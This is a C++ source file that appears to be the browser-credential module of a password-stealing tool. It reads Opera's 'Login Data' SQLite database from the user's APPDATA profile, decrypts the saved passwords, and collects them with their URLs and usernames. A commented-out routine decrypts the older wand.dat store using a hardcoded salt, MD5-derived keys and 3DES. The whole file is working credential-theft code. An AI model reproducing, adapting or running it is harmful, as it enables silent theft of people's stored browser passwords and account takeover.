#include "COpera.h"
#include "CChrome.h"
#include "../SQLite/sqlite3.h"

const unsigned char opera_salt[11] = { 0x83, 0x7D, 0xFC, 0x0F, 0x8E, 0xB3, 0xE8, 0x69, 0x73, 0xAF, 0xFF };

struct p_entry {
	WCHAR service[64];
	WCHAR resource[255];
	WCHAR user_name[255];
	WCHAR user_value[255];
	WCHAR pass_name[255];
	WCHAR pass_value[255];
};

#define FORM_FIELDS 0x0c020000

#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);

COpera::COpera()
{
}

COpera::~COpera()
{
}

/*
void COpera::SaveData(WCHAR *url, WCHAR *user, WCHAR *pass)
{
	get_Opera op;
	ZeroMemory(&op, sizeof(get_Opera));
	wcsncpy(op.url, url, wcslen(url));
	wcsncpy(op.user_name, user, wcslen(url));
	wcsncpy(op.pass_name, pass, wcslen(url));

	pOP.push(op);
}

int COpera::DumpOP(WCHAR *profilePath, WCHAR *signonFile)
{
	WCHAR wandPath[MAX_PATH];
	unsigned char *wandData, *wandMap;
	unsigned long fileSize;
	HANDLE hFile;
	HANDLE hMap;
	p_entry opentry;

	memset(&opentry, 0, sizeof(opentry));

	_snwprintf_s(wandPath, MAX_PATH, _TRUNCATE, L"%s\\%s", profilePath, signonFile);

	if ((hFile = CreateFileW(wandPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
		return 0;

	fileSize = GetFileSize(hFile, NULL);

	if ((hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return 0;
	}

	wandMap = (unsigned char *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

	wandData = (unsigned char *)malloc(fileSize);
	memcpy(wandData, wandMap, fileSize);
	
	CloseHandle(hFile);
	UnmapViewOfFile(wandMap);
	CloseHandle(hMap);

	swprintf_s(opentry.service, 255, L"Opera");

	unsigned long wandOffset = 0;
	int field_num = 0;

	//
	// main loop, find and process encrypted blocks
	//

	while(wandOffset < fileSize)
	{
		DWORD *field_type;

		// find key length field at start of block
		unsigned char *wandKey = (unsigned char *)
			memchr(wandData + wandOffset, DES_KEY_SZ, fileSize - wandOffset);

		if (wandKey == NULL)
			break;

		// Vede quando cominciano i field
		field_type = (DWORD *)(++wandKey);
		field_type-=3;

		wandOffset = wandKey - wandData;

		// create pointers to length fields
		unsigned char *blockLengthPtr = wandKey - 8;
		unsigned char *dataLengthPtr = wandKey + DES_KEY_SZ;

		if(blockLengthPtr < wandData || dataLengthPtr > wandData + fileSize)
			continue;

		// convert big-endian numbers to native
		unsigned long blockLength  = *blockLengthPtr++ << 24;
		blockLength |= *blockLengthPtr++ << 16;
		blockLength |= *blockLengthPtr++ <<  8;
		blockLength |= *blockLengthPtr;

		unsigned long dataLength  = *dataLengthPtr++ << 24;
		dataLength |= *dataLengthPtr++ << 16;
		dataLength |= *dataLengthPtr++ <<  8;
		dataLength |= *dataLengthPtr;

		// as discussed in the article
		if (blockLength != dataLength + DES_KEY_SZ + 4 + 4)
			continue;

		// perform basic sanity checks on data length
		if (dataLength > fileSize - (wandOffset + DES_KEY_SZ + 4) || dataLength < 8 || dataLength % 8 != 0)
			continue;

		unsigned char
			hashSignature1[MD5_DIGEST_LENGTH],
			hashSignature2[MD5_DIGEST_LENGTH],
			tmpBuffer[256];

		memset(hashSignature1, 0, MD5_DIGEST_LENGTH);
		memset(hashSignature2, 0, MD5_DIGEST_LENGTH);
		memset(tmpBuffer, 0, 256);
		//
		// hashing of (salt, key), (hash, salt, key)
		//

		memcpy(tmpBuffer, opera_salt, sizeof(opera_salt));
		memcpy(tmpBuffer + sizeof(opera_salt), wandKey, DES_KEY_SZ);

		MD5(tmpBuffer, sizeof(opera_salt) + DES_KEY_SZ, hashSignature1);

		memcpy(tmpBuffer, hashSignature1, sizeof(hashSignature1));
		memcpy(tmpBuffer + sizeof(hashSignature1), opera_salt, sizeof(opera_salt));

		memcpy(tmpBuffer + sizeof(hashSignature1) + sizeof(opera_salt), wandKey, DES_KEY_SZ);

		MD5(tmpBuffer, sizeof(hashSignature1) + sizeof(opera_salt) + DES_KEY_SZ, hashSignature2);

		//
		// schedule keys. key material from hashes
		//
		DES_key_schedule key_schedule1, key_schedule2, key_schedule3;
		DES_set_key_unchecked((const_DES_cblock *)&hashSignature1[0], &key_schedule1);
		DES_set_key_unchecked((const_DES_cblock *)&hashSignature1[8], &key_schedule2);
		DES_set_key_unchecked((const_DES_cblock *)&hashSignature2[0], &key_schedule3);

		DES_cblock iVector;
		memcpy(iVector, &hashSignature2[8], sizeof(DES_cblock));

		unsigned char *cryptoData = wandKey + DES_KEY_SZ + 4;

		//
		// decrypt wand data in place using 3DES-CBC
		//
		DES_ede3_cbc_encrypt(cryptoData, cryptoData, dataLength, &key_schedule1, &key_schedule2, &key_schedule3, &iVector, 0);

		if (*cryptoData != 0x00 && *cryptoData != 0x08) {
			// remove padding (data padded up to next block)
			unsigned char *padding = cryptoData + dataLength - 1;
			memset(padding - (*padding - 1), 0x00, *padding);
			
			// se comincia con "http" e' un url, quindi contiamo il numero di
			// field che ci sono, il primo e' il nome, il secondo e' il valore

			if (field_num == 4) {
				field_num++;
				swprintf_s(opentry.pass_value, 255, L"%s", cryptoData);
				SaveData(opentry.resource, opentry.user_value, opentry.pass_value);
			}
			if (field_num == 3) {
				// salta i dispari che sono i nome dei field
				field_num++;
			}
			if (field_num == 2) {
				field_num++;
				swprintf_s(opentry.user_value, 255, L"%s", cryptoData);
			}
			if (field_num == 1 && (*field_type) == FORM_FIELDS) {
				// salta i dispari che sono i nome dei field
				field_num++;
			}
			if (!wcsncmp((WCHAR *)cryptoData, L"http", 4)) {
				field_num = 1;
				swprintf_s(opentry.resource, 255, L"%s", cryptoData);
			}
		}

		wandOffset = wandOffset + DES_KEY_SZ + 4 + dataLength;
	}

	SAFE_FREE(wandData);

	return 1;
}
*/
int COpera::parse_opera_signons(void *param, int argc, char **argv, char **azColName)
{
	COpera* pThis = (COpera*)param;
	get_Opera getOpera = {0};

	for(int i=0; i<argc; i++){
		if (!strcmp(azColName[i], "origin_url")) {
			_snwprintf_s(getOpera.url, 255, _TRUNCATE, L"%S", argv[i]);
		}
		if (!strcmp(azColName[i], "username_value")) {
			_snwprintf_s(getOpera.user_name, 255, _TRUNCATE, L"%S", argv[i]);
		}
		if (!strcmp(azColName[i], "password_value")) {
			CChrome::DecryptPass(argv[i], getOpera.pass_name, 255);
		}
	}
	
	pThis->pOP.push(getOpera);
	return 0;
}

int COpera::DumpSqlOP(WCHAR *profilePath, WCHAR *signonFile)
{
	sqlite3 *db;
	WCHAR sqlPath[MAX_PATH] = {0};
	swprintf_s(sqlPath, MAX_PATH, L"%s//%s", profilePath, signonFile);
	int rc;

	if ((rc = sqlite3_open16(sqlPath, &db)))
		return 0;
	int nResult = sqlite3_exec(db, "SELECT * FROM logins;", parse_opera_signons, this, NULL);

	sqlite3_close(db);

	return 1;
}

WCHAR *COpera::GetOPProfilePath()
{
	WCHAR appPath[MAX_PATH];
	static WCHAR FullPath[MAX_PATH];
 
	GetEnvironmentVariableW(L"APPDATA", appPath, MAX_PATH);

	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Opera\\Opera\\profile", appPath);

	return FullPath;
}

WCHAR *COpera::GetOPProfilePath11()
{
	WCHAR appPath[MAX_PATH];
	static WCHAR FullPath[MAX_PATH];
 
	GetEnvironmentVariableW(L"APPDATA", appPath, MAX_PATH);

	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Opera\\Opera", appPath);

	return FullPath;
}

WCHAR *COpera::GetOPProfilePathNext()
{
	WCHAR appPath[MAX_PATH];
	static WCHAR FullPath[MAX_PATH];
 
	GetEnvironmentVariableW(L"APPDATA", appPath, MAX_PATH);

	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Opera Software\\Opera Stable", appPath);

	return FullPath;
}

int COpera::DumpOpera(void)
{
	WCHAR *ProfilePath = NULL; 	//Profile path

	//Old Version
	//ProfilePath = GetOPProfilePath();
	//DumpOP(ProfilePath, L"wand.dat");
	//ProfilePath = GetOPProfilePath11();
	//DumpOP(ProfilePath, L"wand.dat");

	//New Version
	ProfilePath = GetOPProfilePathNext();
	DumpSqlOP(ProfilePath, L"Login Data");

	return 0;
}
